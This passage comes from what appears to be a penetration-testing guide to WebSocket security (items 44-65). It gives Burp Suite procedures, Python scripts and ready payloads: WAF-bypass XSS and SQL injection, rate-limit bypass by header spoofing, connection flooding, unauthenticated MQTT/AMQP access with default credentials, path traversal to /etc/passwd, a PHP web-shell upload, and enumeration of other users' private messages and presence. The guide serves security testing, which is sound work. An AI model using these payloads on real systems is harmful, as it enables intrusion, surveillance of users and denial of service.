WAF blocks <script>alert(1)</script> but \u003cscript\u003e gets through and the server renders/processes it as a script tag
WAF blocks ' OR 1=1-- but '/**/OR/**/1=1-- bypasses and causes SQL behavior change
Null byte insertion (\u0000) in the middle of a keyword bypasses WAF pattern matching
Case variation gets through WAF that only checks lowercase patterns

Severity: HIGH to CRITICAL

44. WebSocket Rate Limiting Bypass
Steps:

Open Burp Suite → Proxy → WebSockets history → Find any rate-limited endpoint (try sending a message many times and see when you get rate limited/blocked)
Go to Intruder → Send the WebSocket Upgrade request from HTTP history → Run 100 rapid connections → Note how many succeed before rate limiting kicks in
After finding the rate limit threshold, try bypass techniques:

Try different auth tokens (if you have multiple test accounts):

Rotate between 3 different Cookie: session= values in Repeater

Try changing IP via headers in the Upgrade request:
X-Forwarded-For: 1.2.3.4
X-Forwarded-For: 5.6.7.8
X-Real-IP: 1.2.3.4
After each block, change the IP header value and try again

Try opening many connections simultaneously instead of sequentially — use Intruder with high concurrency:


Rate limits that count requests per second may allow bursts before the counter updates


Try changing User-Agent after hitting the rate limit:

User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)

Try rate limit bypass on message sending (not just connection) — connect once, then in Repeater send 1000 messages via Intruder using the existing WebSocket connection (null payloads, 1000 count)
Try waiting for rate limit reset — wait exactly 1 minute (common reset window) then continue → Document the exact reset time

🔴 Vulnerable When:

Adding X-Forwarded-For: 1.2.3.4 resets your rate limit counter (rate limiting is based on header, not real IP)
Rotating between 3 session tokens lets you send 3x the rate-limited amount
Sending messages within an established connection has no rate limit even if new connection creation is limited
Intruder flood succeeds at 10x the intended rate limit (rate limiting not enforced properly)

Severity: MEDIUM to HIGH

45. WebSocket Concurrent Connection Abuse
Steps:

Open Burp Suite → Proxy → HTTP history → Find WebSocket Upgrade request → Send to Intruder
In Intruder → Positions tab → No position markers needed (just repeating) → Payloads → Null payloads → Count: 200
Resource Pool → Create new pool → Maximum concurrent requests: 200 → This opens 200 simultaneous WebSocket connections
Click Start Attack → Watch how many succeed (101 responses) and when rejections start
Note the number where rejection starts (e.g., after 50 connections) → That's the concurrent connection limit
Now try to bypass the limit per account by using multiple accounts:


Use Burp Session Handling Rules → Configure to rotate between 3 session cookies for each request
Re-run Intruder with 200 connections using rotating sessions → Check if limit is per-account or global


Try not closing connections — keep all 200 open in Intruder → Then try to open connections from a different test account → Are legitimate users blocked?
Try opening connections from different IPs (use upstream proxy in Burp options) → Check if limit is per-IP or total across all IPs
Monitor server resource usage if you have access to the target's metrics — or measure response time degradation as proxy for resource exhaustion

🔴 Vulnerable When:

All 200 concurrent connections from the same account succeed with no error (no per-account limit)
When 200 connections are held open, new connection attempts from other accounts return errors (global limit exploited to deny service)
Connection limit is enforced per-IP but bypass via X-Forwarded-For header rotation allows unlimited connections
Server response times degrade significantly as connection count rises (resource exhaustion)

Severity: HIGH

46. WebSocket Idle Timeout Exploitation for Persistence
Steps:

Open Burp Suite → Establish a WebSocket connection → Go to Proxy → WebSockets history → Note your active connection
Don't send any messages — leave the connection completely idle → Watch Burp WebSockets history to see when the server closes the connection → Time it with a clock → Note the idle timeout value (e.g., 30 seconds, 5 minutes, 30 minutes)
Set up an automated keepalive to bypass idle timeout — in Burp Repeater, send a ping message every 25 seconds (before the timeout) → Check if you can keep the connection alive indefinitely this way
Try using this script through Burp to maintain permanent persistence:

pythonimport websocket, time, threading

def keepalive(ws):
    while True:
        time.sleep(25)
        try:
            ws.ping(b'keepalive')
        except:
            break

ws = websocket.create_connection("wss://target.com/ws",
    header=["Cookie: session=YOUR_SESSION"])

thread = threading.Thread(target=keepalive, args=(ws,))
thread.daemon = True
thread.start()

# Connection stays alive indefinitely
time.sleep(3600)  # 1 hour
print("Still connected after 1 hour:", ws.connected)

If connection stays alive: log out from the application → Check if the WebSocket in Repeater is also disconnected or still alive
Try changing the session cookie mid-connection (in a separate HTTP request, log out and log in as different user) → Check if the long-lived WebSocket still operates under the old user's context
Try to enumerate what data arrives over the long-lived connection — stay connected for 30+ minutes and capture all server-push messages

🔴 Vulnerable When:

Ping keepalive prevents idle timeout and you remain connected indefinitely
After logout, the WebSocket connection remains alive and still accepts/processes messages with the expired session
Long-lived connection continues to receive other users' real-time events due to server-side state issues
Server has no idle timeout at all — connection stays open for hours with no activity

Severity: MEDIUM to HIGH

47. WebSocket Reconnection Logic Security Vulnerability
Steps:

Open Burp Suite → Proxy → WebSockets history → Establish a connection → Then close it abruptly (stop Burp's interception or use Repeater disconnect button) → Watch the application in the browser — does it attempt to auto-reconnect?
In HTTP history, watch for new WebSocket Upgrade requests appearing right after you killed the connection → This is the auto-reconnect logic
Check the reconnection Upgrade request — does it use the same token as before, or does it get a fresh one? → If same token: the token might be static and predictable
Set up Proxy Match and Replace → Rule: intercept WebSocket Upgrade requests and return 503 Service Unavailable → Count how many times the app retries → Does it retry infinitely? Does it expose error details in each retry?
Check reconnection timing — capture timestamps of each reconnect attempt → Is there exponential backoff? Or does it retry at fixed intervals (exploitable for DoS amplification)?
Intercept the reconnection request → Modify the token used in the reconnect → Change it to a different user's token → See if reconnection succeeds with another user's auth
Try killing the connection during a sensitive operation (mid-transfer, mid-subscribe) → Check if the app's reconnection re-executes the interrupted action (double action bug)
Check if reconnection sends the same initial subscribe/auth messages → Capture those messages and replay them on a fresh connection manually

🔴 Vulnerable When:

Reconnection uses a static, predictable token that doesn't expire (can be predicted/reused by attacker)
App retries indefinitely without backoff, flooding the server with upgrade requests (self-DoS)
Reconnection re-executes actions that were interrupted, causing double processing
Reconnect token from history can be replayed to hijack reconnection as another user

Severity: MEDIUM to HIGH

48. WebSocket Fallback Transport Security (XHR/SSE)
Steps:

Open Burp Suite → Proxy → Enable Intercept → Open the target app in Burp browser → Go to Proxy Options → Add a Match and Replace rule: Response header — match 101 status → Replace with 403 → This blocks WebSocket upgrades → Watch what the app does
With WebSocket blocked, go to HTTP history → Look for new request patterns:


GET /socket.io/?transport=polling (Socket.IO XHR fallback)
GET /events with Content-Type: text/event-stream (SSE fallback)
POST /xhr_streaming or /xhr


Find the fallback endpoint in HTTP history → Right-click → Send to Repeater → Check if it has the same authentication requirements as the WebSocket
For XHR polling fallback, check:


Is CSRF protection applied to the POST requests?
Are messages rate limited?
Is the same Origin validation applied?


For SSE fallback, check:


Can you subscribe to SSE feed without authentication?
Try changing user ID parameters in the SSE URL


Try accessing the fallback endpoint directly even when WebSocket is available → Some apps leave fallback endpoints unsecured since they assume WebSocket will be used
Compare what data is available via fallback vs WebSocket → Fallback might expose more or less data → Check if auth checks differ between the two transport methods
Try CORS bypass on XHR fallback → XHR endpoints might have looser CORS than the WebSocket origin check

🔴 Vulnerable When:

Fallback XHR endpoint lacks CSRF token requirement that the main app enforces
SSE fallback endpoint works without authentication cookie
Fallback endpoint accessible from cross-origin while WebSocket is not (different CORS policies)
Fallback transport allows subscribing to other users' event streams

Severity: HIGH

49. WebSocket Socket.IO Authentication Bypass
Steps:

Open Burp Suite → Proxy → HTTP history → Look for requests to /socket.io/ → These indicate Socket.IO is being used → Find the polling requests and WebSocket upgrade
Socket.IO typically connects in two phases: HTTP polling first, then WebSocket upgrade → Look at the first polling request:

GET /socket.io/?EIO=4&transport=polling&t=Nxxxxxxx

Right-click the polling request → Send to Repeater → Remove auth cookies/headers → Click Send → Check if you still get {"sid":"...","upgrades":["websocket"]} back (successful session ID issued without auth)
If you get a session ID (sid) without auth, use it for the WebSocket upgrade:

GET /socket.io/?EIO=4&transport=websocket&sid=GOT_SESSION_ID_HERE
Remove auth headers → Click Send → Does it upgrade successfully?

Look at the Socket.IO namespace — default is /, but apps may use custom namespaces:

GET /socket.io/admin/?EIO=4&transport=polling
GET /socket.io/private/?EIO=4&transport=polling
Try accessing restricted namespaces without auth

After connecting without auth, send Socket.IO events:

42["getProfile",{"userId":1}]
42["subscribe",{"channel":"admin"}]
42["joinRoom",{"room":"team-secret"}]
(42 is Socket.IO's message encoding: 4 = message type, 2 = event)

Try namespace injection — in the Socket.IO connection packet, try connecting to:

40/admin,   (connect to /admin namespace)
40/private,
40/../admin,
🔴 Vulnerable When:

Socket.IO issues a valid session ID (sid) without any authentication
Using that unauthenticated sid to upgrade to WebSocket succeeds
Admin or private namespaces (/admin, /private) are accessible without authentication
After connecting unauthenticated, events like getProfile return real data

Severity: CRITICAL

50. WebSocket Socket.IO Room Subscription Abuse
Steps:

Open Burp Suite → Proxy → WebSockets history → Find Socket.IO messages → They look like:

42["joinRoom",{"roomId":"team_123_general"}]
42["subscribe",{"channel":"user_456_private"}]

Right-click → Send to Repeater → Change the room/channel ID to belong to another user or team:

42["joinRoom",{"roomId":"team_789_general"}]
42["subscribe",{"channel":"user_999_private"}]
Click Send → Check if room join is acknowledged (server sends 40/room_name, confirmation)

If join succeeds, wait 30 seconds → Check if you start receiving messages in Repeater that contain other users' data
Try joining privileged rooms:

42["joinRoom",{"roomId":"admin_room"}]
42["joinRoom",{"roomId":"system_alerts"}]
42["joinRoom",{"roomId":"all_users_broadcast"}]

Try room ID enumeration → Go to Intruder → Mark the room ID number as payload position → Numbers 1 to 500 → Run → Check which room IDs return successful join acknowledgments
Try joining a room and then emitting events to that room (not just receiving):

42["roomMessage",{"roomId":"team_789_general","message":"injected"}]
Check if your message appears in the room

Try leaving rooms you weren't supposed to be in and check if that changes the server-side state in a useful way:

42["leaveRoom",{"roomId":"admin_room"}]
Then try to rejoin — does the second join get better access?
🔴 Vulnerable When:

Joining another user's private room (user_456_private) succeeds and you receive their private messages
Admin room join is not rejected and you start receiving admin broadcast messages
Emitting a message to a room you joined by enumeration causes that message to be delivered to real users (XSS/injection delivery vector)
Room ID enumeration (1-500) reveals rooms belonging to users other than yourself

Severity: CRITICAL

51. WebSocket SignalR Hub Access Control Bypass
Steps:

Open Burp Suite → Proxy → HTTP history → Look for SignalR endpoints:

GET /signalr/negotiate?negotiateVersion=1
GET /chatHub/negotiate
POST /hub/negotiate

Find the negotiate request → Right-click → Send to Repeater → Remove auth headers → Check if you get back a connection token without auth
Find WebSocket upgrade for SignalR (usually after negotiate) → Look like:

GET /signalr?id=CONNECTION_TOKEN

Try accessing different Hub names in the URL:

GET /adminHub/negotiate
GET /internalHub/negotiate
GET /managementHub/negotiate
GET /systemHub/negotiate

After connecting to a hub, send hub method invocations:
SignalR protocol messages look like:

json{"type":1,"invocationId":"0","target":"GetAllUsers","arguments":[]}
{"type":1,"invocationId":"1","target":"GetAdminData","arguments":[]}
{"type":1,"invocationId":"2","target":"BroadcastToAll","arguments":["test message"]}

Try invoking methods that should be admin-only:

json{"type":1,"invocationId":"3","target":"DeleteUser","arguments":["victim@email.com"]}
{"type":1,"invocationId":"4","target":"GetSystemConfig","arguments":[]}

Try accessing groups you shouldn't be in:

json{"type":1,"invocationId":"5","target":"JoinGroup","arguments":["AdminGroup"]}
🔴 Vulnerable When:

SignalR negotiate endpoint returns connection token without valid authentication
Accessing /adminHub returns a valid connection token without admin role check
Invoking GetAllUsers or GetAdminData hub methods returns real data for unauthenticated or non-admin user
AddToGroup("AdminGroup") method allows self-escalation to admin group

Severity: CRITICAL

52. WebSocket STOMP Protocol Security Vulnerability
Steps:

Open Burp Suite → Proxy → WebSockets history → Look for STOMP protocol messages — they look like plain text frames (not JSON):

CONNECT
accept-version:1.2
host:target.com
login:user
passcode:password

^@
(^@ is null byte frame terminator)

Right-click a STOMP message → Send to Repeater → Try a CONNECT frame without credentials:

CONNECT
accept-version:1.2
host:target.com

^@
Check if server responds with CONNECTED frame

After connecting, try subscribing to admin destinations:

SUBSCRIBE
id:sub-0
destination:/topic/admin
ack:auto

^@
SUBSCRIBE
id:sub-1
destination:/queue/system.logs
ack:auto

^@

Try sending messages to destinations you shouldn't write to:

SEND
destination:/app/adminAction
content-type:application/json

{"action":"deleteUser","userId":1}^@

Try destination injection — inject path traversal in STOMP destination:

SUBSCRIBE
destination:/../admin/secret
SUBSCRIBE
destination:/topic/user.1 UNION SELECT password FROM users

Try STOMP header injection — inject CRLF in header values:

SEND
destination:/app/chat
custom-header:value\r\nauthorization:admin

message content^@

Try subscribe to another user's private queue:

SUBSCRIBE
destination:/user/otheruser@email.com/queue/messages
id:sub-2
🔴 Vulnerable When:

CONNECT frame without login/passcode returns CONNECTED (no authentication enforced)
Subscribe to /topic/admin or /queue/system.logs succeeds and you receive privileged messages
SEND to admin destinations allows executing privileged actions
Subscribing to /user/otheruser@email.com/queue/messages delivers another user's private messages to you

Severity: CRITICAL

53. WebSocket WAMP Protocol Authentication Bypass
Steps:

Open Burp Suite → Proxy → WebSockets history → Look for WAMP protocol messages — they are JSON arrays starting with a number:

json[1, "realm1", {}]                      // HELLO message (type 1)
[2, 12345, {}, {}]                     // WELCOME message (type 2)
[32, 12345, {}, "com.example.topic"]   // SUBSCRIBE (type 32)
[48, 12345, {}, "com.example.proc"]    // CALL (type 48)

Right-click a HELLO message → Send to Repeater → Try connecting to different realms:

json[1, "admin", {}]
[1, "internal", {}]
[1, "system", {}]
[1, "com.example.private", {}]
Check if you get WELCOME responses for these restricted realms

After getting a WELCOME, try subscribing to topics you shouldn't access:

json[32, 1, {}, "com.example.admin.events"]
[32, 2, {}, "com.example.private.data"]
[32, 3, {}, "wamp.session.on_join"]

Try calling remote procedures that should be admin-only:

json[48, 1, {}, "com.example.admin.deleteUser", ["userId123"]]
[48, 2, {}, "com.example.admin.getConfig", []]
[48, 3, {}, "com.example.users.getAll", []]

Try publishing to topics you should only be able to subscribe to:

json[16, 1, {}, "com.example.user.notifications", ["injected_event"]]

Check WAMP authentication: if WAMP-CRA or WAMP-SCRAM is used, look for authentication challenge messages in WebSockets history → Try replaying old challenge responses

🔴 Vulnerable When:

HELLO to admin or internal realm returns WELCOME without credentials
Subscribing to admin topics after connecting to any realm returns privileged event data
Calling admin remote procedures succeeds without elevated role
Publishing to topics you shouldn't write to succeeds and injects events to other users

Severity: CRITICAL

54. WebSocket GraphQL Subscription Security
Steps:

Open Burp Suite → Proxy → WebSockets history → Look for GraphQL subscription messages:

json{"type":"connection_init","payload":{}}
{"type":"start","id":"1","payload":{"query":"subscription { messageAdded { id text author } }"}}

Right-click the connection_init → Send to Repeater → Try initiating without auth token:

json{"type":"connection_init","payload":{}}
Then send a subscription → Check if data flows without auth

Try subscribing to other users' data:

json{"type":"start","id":"1","payload":{
  "query":"subscription { userUpdated(userId: \"victim_id\") { email password phone } }"
}}

Try introspection via subscription (find what subscriptions exist):

json{"type":"start","id":"2","payload":{
  "query":"{ __schema { subscriptionType { fields { name description } } } }"
}}

Try nested subscription queries that might cause DoS:

json{"type":"start","id":"3","payload":{
  "query":"subscription { userAdded { friends { friends { friends { friends { id name } } } } } }"
}}

Try subscribing to admin events:

json{"type":"start","id":"4","payload":{
  "query":"subscription { adminAction { type userId data } }"
}}
{"type":"start","id":"5","payload":{
  "query":"subscription { systemLog { level message timestamp } }"
}}

Try unauthorized field access in subscription:

json{"type":"start","id":"6","payload":{
  "query":"subscription { messageAdded { id text author { password secretKey internalNotes } } }"
}}
🔴 Vulnerable When:

Subscription works without auth token in connection_init payload
userUpdated(userId: "victim_id") returns another user's real-time updates
Admin subscriptions like adminAction or systemLog return data for non-admin users
Nested subscription query causes server slowdown (GraphQL DoS via subscription)
User fields like password or secretKey are returned in subscription responses

Severity: CRITICAL

55. WebSocket MQTT over WebSocket Security
Steps:

Open Burp Suite → Proxy → WebSockets history → Identify MQTT over WebSocket — the Upgrade request uses subprotocol mqtt:

Sec-WebSocket-Protocol: mqtt
And messages are binary MQTT protocol frames

Find the MQTT CONNECT packet in WebSockets history (it's the first binary message after WebSocket upgrade) → Note if it contains username/password fields
Use Python through Burp to send MQTT CONNECT without credentials:

pythonimport websocket

def create_mqtt_connect():
    # MQTT CONNECT packet without credentials
    protocol_name = b'\x00\x04MQTT'
    protocol_level = b'\x04'  # MQTT 3.1.1
    connect_flags = b'\x00'   # No username, no password, clean session
    keep_alive = b'\x00\x3c'  # 60 seconds
    client_id = b'\x00\x08testclient'
    
    payload = protocol_name + protocol_level + connect_flags + keep_alive + client_id
    remaining_length = len(payload)
    
    return bytes([0x10, remaining_length]) + payload

ws = websocket.create_connection("wss://target.com/mqtt",
    http_proxy_host="127.0.0.1", http_proxy_port=8080,
    subprotocols=["mqtt"])
ws.send_binary(create_mqtt_connect())
print(ws.recv())  # Should get CONNACK

If CONNACK returns with 0x00 (success without auth), try subscribing to all topics using wildcard:

python# MQTT SUBSCRIBE to all topics with # wildcard
subscribe_packet = bytes([0x82, 0x05, 0x00, 0x01, 0x00, 0x01, 0x23, 0x00])
# 0x23 = '#' wildcard
ws.send_binary(subscribe_packet)

Try subscribing to sensitive topic patterns:

#              (all topics)
$SYS/#         (broker system topics - contains stats and config)
users/#        (all user topics)
admin/#        (admin topics)
devices/#      (IoT device topics)

Try publishing to topics you should only subscribe to:

python# MQTT PUBLISH to a command topic
topic = b'devices/device001/command'
message = b'{"cmd":"shutdown"}'
🔴 Vulnerable When:

MQTT CONNECT without username/password receives CONNACK success (0x00)
Subscribing to # wildcard returns messages from all topics including private ones
Subscribing to $SYS/# returns broker configuration, connected client lists, statistics
Publishing to devices/*/command allows sending commands to IoT devices
Subscribing to other users' topics delivers their private messages

Severity: CRITICAL

56. WebSocket AMQP over WebSocket Access Control
Steps:

Open Burp Suite → Proxy → WebSockets history → Look for AMQP over WebSocket — Upgrade request may use:

Sec-WebSocket-Protocol: amqp

The AMQP protocol starts with a protocol header frame → Look for the binary frame AMQP\x00\x00\x09\x01 in WebSockets history
Try connecting without credentials (AMQP SASL PLAIN with empty credentials):

pythonimport websocket, struct

ws = websocket.create_connection("wss://target.com/amqp",
    http_proxy_host="127.0.0.1", http_proxy_port=8080,
    subprotocols=["amqp"])

# Send AMQP protocol header
ws.send_binary(b'AMQP\x00\x00\x09\x01')
# Then send SASL INIT with empty credentials

Try using default credentials common in AMQP (RabbitMQ defaults):

Username: guest / Password: guest
Username: admin / Password: admin
Username: rabbit / Password: rabbit

After connecting, try accessing queues that belong to other users or virtual hosts:

Queue: admin.queue
Queue: system.notifications
Queue: user.1.private

Try consuming messages from queues you shouldn't access → In AMQP this is a basic.consume or basic.get operation
Try publishing to exchanges you shouldn't write to (routing messages to other users' queues)

🔴 Vulnerable When:

AMQP connects without credentials or with default credentials (guest/guest)
You can consume from admin.queue or system.notifications queues
Publishing to an exchange routes to other users' private queues (message injection)
No virtual host isolation — accessing one vhost gives access to all

Severity: CRITICAL

57. WebSocket gRPC-Web Security Vulnerability
Steps:

Open Burp Suite → Proxy → HTTP history → Look for gRPC-Web requests — they have:

Content-Type: application/grpc-web
Content-Type: application/grpc-web+proto
Or WebSocket with Sec-WebSocket-Protocol: grpc-websockets

Install grpcurl on the testing machine and route it through Burp proxy:

bash# Install grpcurl
go install github.com/fullstorydev/grpcurl/cmd/grpcurl@latest

# Use through Burp proxy
export https_proxy=http://127.0.0.1:8080

# List all available gRPC services
grpcurl -insecure target.com:443 list

Once you have service names, list all methods:

bashgrpcurl -insecure target.com:443 list com.example.UserService

Try calling admin methods as a regular user:

bashgrpcurl -insecure \
  -H "Authorization: Bearer YOUR_USER_TOKEN" \
  target.com:443 com.example.AdminService/GetAllUsers

Try calling methods without any auth token:

bashgrpcurl -insecure target.com:443 com.example.UserService/GetProfile \
  -d '{"userId": "1"}'

Try proto injection — send unexpected field values:

bashgrpcurl -insecure \
  -H "Authorization: Bearer YOUR_TOKEN" \
  target.com:443 com.example.UserService/GetUser \
  -d '{"userId": "../../admin/config"}'

In Burp, intercept gRPC-Web requests → The binary proto body can be decoded → Use Burp's Inspector panel to look at the binary data → Modify protobuf field values (field IDs and values are encoded in binary)

🔴 Vulnerable When:

grpcurl list returns service names without requiring authentication (exposes API surface)
Admin service methods (AdminService/GetAllUsers) respond to regular user tokens
Any gRPC method works without an auth token
Proto field injection (path traversal in string fields) causes unexpected server behavior

Severity: HIGH to CRITICAL

58. WebSocket Real-Time Data Leakage via Subscription
Steps:

Open Burp Suite → Log in as User A → Proxy → WebSockets history → Note all subscription messages sent → Note all data received as push messages from server
Log in as User B in another Burp browser tab (or use Proxy → Session handling with two separate sessions)
As User A, subscribe to a feed that should be private to User B:

json{"action":"subscribe","feed":"user_B_id_activity"}
{"action":"watch","userId":"B_USER_ID"}
{"action":"follow","targetId":"B_USER_ID"}

As User B, perform actions in the browser — check if User A receives real-time updates about those actions in Burp WebSockets history
Check for global broadcast subscriptions that accidentally include private data:

json{"action":"subscribe","channel":"global_feed"}
{"action":"subscribe","channel":"all_events"}
After subscribing, watch what data flows — does it include data from other users?

Try subscribing to aggregated data streams that might leak individual user data:

json{"action":"subscribe","channel":"analytics_feed"}
{"action":"subscribe","channel":"metrics_stream"}

In Burp, go to WebSockets history → Look at the server-to-client messages (direction arrows) → Click through each push message → Look for user IDs, emails, names that don't belong to your account

🔴 Vulnerable When:

Subscribing to another user's feed results in receiving their real-time activity updates
Global/broadcast channel leaks personally identifiable information about specific users
Analytics/metrics stream includes raw user data instead of aggregated statistics
Server push messages contain other users' private data mixed with your own data

Severity: HIGH to CRITICAL

59. WebSocket Presence Status Information Disclosure
Steps:

Open Burp Suite → Proxy → WebSockets history → Subscribe to presence/status channel:

json{"action":"presence","channel":"global"}
{"action":"subscribe","event":"presence"}
{"action":"getOnlineUsers"}

Watch incoming server push messages → Note what user information is included with presence status:


Only user ID? (acceptable)
Username? (might be okay)
Email address? (problematic)
IP address? (serious issue)
Location? Device? (serious issue)


Try enumerating all online users by subscribing to a presence channel → Count how many users are returned → Compare with what the app UI shows (UI might intentionally hide users)
Try getting presence status for a specific target user:

json{"action":"getPresence","userId":"TARGET_USER_ID"}
{"action":"subscribe","channel":"user_TARGET_USER_ID_status"}

Check if offline users' last seen timestamps are exposed:

json{"action":"getLastSeen","userId":"TARGET_USER_ID"}

Try to correlate presence data → Watch when a target user's status changes → This reveals when they're active on the platform (behavioral tracking)
Check if presence unsubscribe works properly — subscribe then unsubscribe → Check if server still sends you presence updates for that user

🔴 Vulnerable When:

Presence channel reveals email addresses or IP addresses of online users
You can get real-time online/offline status of any user by their ID (stalking vector)
Last seen timestamps are available for any user without their consent
Presence data includes location or device information
After unsubscribing from presence, server continues sending updates

Severity: MEDIUM to HIGH

60. WebSocket Typing Indicator Surveillance
Steps:

Open Burp Suite → Proxy → WebSockets history → Find typing indicator messages — they look like:

json{"type":"typing","conversationId":"conv_123","isTyping":true}
{"event":"user_typing","chatId":"room_456","userId":"user_789"}

Try subscribing to typing events for conversations you're not part of:

json{"action":"subscribe","event":"typing","conversationId":"OTHER_CONV_ID"}
{"action":"watchTyping","channelId":"PRIVATE_CHANNEL_ID"}

Try getting typing status for a specific user you're not in conversation with:

json{"action":"getTypingStatus","userId":"TARGET_USER_ID"}

Check if typing indicators reveal message content length — some implementations send typing events more frequently for longer messages, leaking approximate message length
Subscribe to typing events for many different conversation IDs sequentially → Use Burp Intruder with conversation ID enumeration → See how many private conversations' typing events you receive
Try sending a fake typing event as another user:

json{"type":"typing","userId":"OTHER_USER_ID","conversationId":"conv_123","isTyping":true}
Check if this causes the other user to appear as typing to other participants
🔴 Vulnerable When:

You can subscribe to typing events in conversations you're not a member of
Typing events for private conversations are received by you (a non-participant)
You can send fake typing events that make another user appear to be typing
Typing indicator frequency reveals approximate message length being composed

Severity: MEDIUM

61. WebSocket Read Receipt Privacy Bypass
Steps:

Open Burp Suite → Proxy → WebSockets history → Find read receipt messages:

json{"type":"read","messageId":"msg_123","conversationId":"conv_456"}
{"event":"message_read","id":"msg_789","readBy":"user_123","readAt":"2024-01-01T10:00:00Z"}

Try subscribing to read receipt events for messages in conversations you're not part of:

json{"action":"subscribe","event":"read_receipts","conversationId":"OTHER_CONV_ID"}

Try sending a fake read receipt as another user:

json{"type":"read","messageId":"msg_123","userId":"OTHER_USER_ID"}
Check if the sender of msg_123 now sees "Read by OTHER_USER" falsely

Try marking messages as read that you shouldn't have access to:

json{"type":"read","messageId":"msg_in_private_conversation"}
This would also reveal to the sender that "you" read their private message

Try getting all read receipts for a specific user:

json{"action":"getUserReadReceipts","userId":"TARGET_USER_ID"}
This could reveal all messages the target has read, building a behavioral profile

Check if read receipts expose the exact timestamp when a user was active → This enables precise activity tracking

🔴 Vulnerable When:

You can subscribe to read receipt events for conversations you're not in
Sending a fake read receipt as another user changes what the message sender sees
Read receipts expose timestamps precise enough to track when a user was online
Marking private messages as "read" works even without being a conversation participant

Severity: MEDIUM

62. WebSocket Online/Offline Status Enumeration
Steps:

Open Burp Suite → Proxy → WebSockets history → Find status messages:

json{"type":"status","userId":"user_123","status":"online"}
{"event":"presence","user":"user_456","online":true,"lastSeen":"2024-01-01T10:00:00Z"}

Try requesting status for any user by ID:

json{"action":"getStatus","userId":"1"}
{"action":"getStatus","userId":"2"}
{"action":"getStatus","userId":"3"}
Go to Burp Intruder → Mark user ID as position → Numbers 1 to 1000 → Run → Collect all online/offline statuses

Try subscribing to status updates for any user:

json{"action":"watchStatus","userId":"TARGET_USER_ID"}
Leave it running for an hour → This tracks exactly when the user logs on and off

Compare status via WebSocket vs what the UI shows — the UI might respect privacy settings (e.g., "hide my status") but the WebSocket might still expose it
Try accessing status via WebSocket without being connected to the target user (not friends, not in the same organization) → Privacy settings should restrict status visibility
Check if blocking a user prevents them from seeing your status → In Repeater, try to get status as a blocked account
Try correlating multiple users' status changes to infer relationships — if users A and B always go online/offline within seconds of each other, they're likely in communication

🔴 Vulnerable When:

getStatus returns status for any user ID regardless of relationship/privacy settings
Subscribing to another user's status works even when they've set status to "hidden"
Intruder sweep 1-1000 returns status data for all user IDs (mass enumeration)
Blocked users can still see your online status via WebSocket despite block

Severity: MEDIUM

63. WebSocket Group Chat Access Control Bypass
Steps:

Open Burp Suite → Proxy → WebSockets history → Find group chat join/subscribe messages:

json{"action":"joinGroup","groupId":"group_123"}
{"event":"subscribe","channel":"group_chat_456"}

Right-click → Send to Repeater → Change the group ID to groups you're not a member of:

json{"action":"joinGroup","groupId":"group_124"}
{"action":"joinGroup","groupId":"private_group_789"}
Click Send → Check if you receive a success response or error

If join succeeds, wait 30 seconds → Perform actions in another browser as a member of that group → Check if you receive the group's messages in Repeater
Try joining admin/staff group chats:

json{"action":"joinGroup","groupId":"admin_chat"}
{"action":"joinGroup","groupId":"staff_only"}
{"action":"joinGroup","groupId":"security_team"}

Try sending messages to groups you're not in (after a failed join attempt):

json{"action":"sendMessage","groupId":"group_124","message":"injected message"}
Check if the message appears in the group for real members

Go to Burp Intruder → Mark group ID as position → Numbers or common group names → Enumerate which groups exist and which you can join
Try to list group members of private groups:

json{"action":"getGroupMembers","groupId":"private_group_789"}
🔴 Vulnerable When:

Joining a group by ID succeeds without being an invited member
After joining a private group, you receive real group messages from actual members
Sending a message to a group you're not in causes that message to be delivered to group members
getGroupMembers returns member list for private groups you're not in (user enumeration)

Severity: CRITICAL

64. WebSocket Direct Message Interception
Steps:

Open Burp Suite → Proxy → WebSockets history → Find direct message subscription:

json{"action":"subscribe","channel":"dm_user_123"}
{"event":"listenDM","fromUserId":"user_456"}

Try subscribing to another user's DM channel:

json{"action":"subscribe","channel":"dm_user_456"}
{"action":"listenDM","userId":"OTHER_USER_ID"}

Try constructing the DM channel identifier for two specific users (often it's a combination of both user IDs):

json{"action":"subscribe","channel":"dm_user_123_user_456"}
{"action":"subscribe","channel":"conversation_user123_user456"}

If you find a pattern in channel names (e.g., dm_SMALLER_ID_LARGER_ID), try subscribing to known users' private conversations
Try sending DMs as another user:

json{"action":"sendDM","fromUserId":"OTHER_USER_ID","toUserId":"user_789","message":"hijacked DM"}

Try accessing DM history via WebSocket:

json{"action":"getDMHistory","userId":"OTHER_USER_ID","page":1}
{"action":"getConversation","conversationId":"conv_between_user1_and_user2"}

Try subscribing to DMs without being logged in — or with a different user's session — to check if channel names alone (without proper auth) grant access

🔴 Vulnerable When:

Subscribing to dm_user_456 channel delivers another user's real private messages to you
Sending DM with fromUserId set to another user's ID delivers the message appearing to come from them (message spoofing)
DM channel names are guessable/predictable and auth check is missing on subscription
getDMHistory returns messages from conversations you're not part of

Severity: CRITICAL

65. WebSocket File Transfer Security
Steps:

Open Burp Suite → Proxy → WebSockets history → Find file transfer messages — they may look like:

json{"type":"file_start","filename":"document.pdf","size":102400,"fileId":"file_abc123"}
{"type":"file_chunk","fileId":"file_abc123","chunk":0,"data":"base64encodeddata..."}
{"type":"file_end","fileId":"file_abc123"}

Try path traversal in filename:

json{"type":"file_start","filename":"../../../etc/passwd","size":100,"fileId":"file_test1"}
{"type":"file_start","filename":"..\\..\\..\\windows\\system32\\config\\sam","size":100}

Try MIME type bypass — upload a PHP file by pretending it's an image:

json{"type":"file_start","filename":"shell.php","contentType":"image/jpeg","size":100,"fileId":"f1"}
{"type":"file_chunk","fileId":"f1","chunk":0,"data":"base64(<?php system($_GET['cmd']); ?>)"}
{"type":"file_end","fileId":"f1"}

Try accessing another user's file by fileId:


Note your own file's ID after upload (e.g., file_abc123)
Try file_abc122, file_abc124 etc. in a download request:

json{"type":"download","fileId":"file_abc122"}

Try downloading files with path traversal in fileId:

json{"type":"download","fileId":"../config/database.yml"}
{"type":"download","fileId":"../../../../etc/passwd"}

Try sending extremely large file to cause DoS:

json{"type":"file_start","filename":"large.txt","size":9999999999}
Then immediately send large base64 chunks to see if server reserves memory based on declared size

Try chunked upload with wrong sequence — send chunk 2 before chunk 1 — does the server reassemble correctly or have a vulnerability in ordering?

🔴 Vulnerable When:

Path traversal in filename causes file to be saved to arbitrary server path
PHP/JSP file upload via WebSocket creates executable file on server
Accessing fileId ±1 from your own lets you download other users' private files
Server allocates memory for the full declared file size immediately (DoS via large declared size)

